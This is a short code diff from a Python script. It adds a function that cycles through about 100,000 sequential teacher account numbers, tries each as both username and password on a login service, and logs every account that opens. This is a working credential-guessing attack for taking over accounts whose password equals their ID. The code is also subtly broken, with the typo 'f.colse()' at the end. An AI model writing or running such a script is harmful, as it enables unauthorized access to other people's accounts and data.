@@ -70,7 +70,23 @@ def search():
         f.close()
     f.close()
 
-search()
+def searchTeacher():
+    tnum1 = 30000000
+    tnum2 = 0
+    f = open("resultT.re", 'a+')
+    while tnum2 < 99999:
+        number = str(tnum1 + tnum2)
+        session = login3.loginget(number, number)
+        if session != '':
+            f.write(number + '\n')
+            print(number + "OK")
+        #if tnum2 % 5  == 0
+        #print(number)
+        tnum2 =  tnum2 + 1
+    f.colse()
+
+#search()
+searchTeacher()
 #session = login3.loginget("201430330133","201430330133")
 #print(session)
 
